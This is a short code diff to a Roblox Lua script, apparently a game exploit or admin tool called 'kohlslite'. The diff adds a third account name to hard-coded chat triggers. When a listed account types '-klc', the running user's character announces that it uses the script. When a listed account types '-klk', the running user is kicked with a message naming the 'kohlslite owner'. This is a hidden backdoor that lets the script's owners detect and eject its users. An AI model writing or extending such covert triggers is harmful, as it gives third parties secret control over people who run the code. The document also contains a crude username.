@@ -4438,11 +4438,11 @@ v.Chatted:Connect(function(msg)
             	end
 		end
 
-		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq") then
+		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "BIGpe7niss7") then
                         Speak("i use kohlslite")
                 end
 
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq") then
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "BIGpe7niss7") then
 			game.Players.LocalPlayer:Kick("SkiddingProgrammer {kohlslite owner} kicked you from the game!")
                 end  
 
